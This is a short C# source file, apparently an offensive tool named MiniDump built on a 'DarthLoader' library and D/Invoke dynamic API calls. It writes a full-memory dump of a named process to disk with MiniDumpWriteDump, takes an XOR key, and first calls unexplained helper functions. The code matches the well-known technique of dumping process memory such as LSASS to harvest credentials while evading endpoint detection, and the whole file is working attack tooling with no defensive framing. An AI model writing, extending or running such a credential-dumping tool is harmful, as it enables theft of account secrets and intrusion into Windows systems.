using DarthLoader;
using System;
using System.Diagnostics;
using System.IO;

using static DInvoke.DynamicInvoke.Win32;

namespace MiniDump
{
    internal class Program
    {
        public static string xorKey = "";
        static void Main(string[] args)
        {

            string procName = args[0];
            string outputPath = args[1];
            xorKey = args[2];

            Helpers.FirstHelperFunction();
            Helpers.SecondHelperFunction();

            var fs = new FileStream(outputPath, FileMode.CreateNew);

            var target = Process.GetProcessesByName(procName)[0];

            MiniDumpWriteDump(target.Handle, (uint)target.Id, fs.SafeFileHandle, MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            fs.Flush();
        }
    }
}
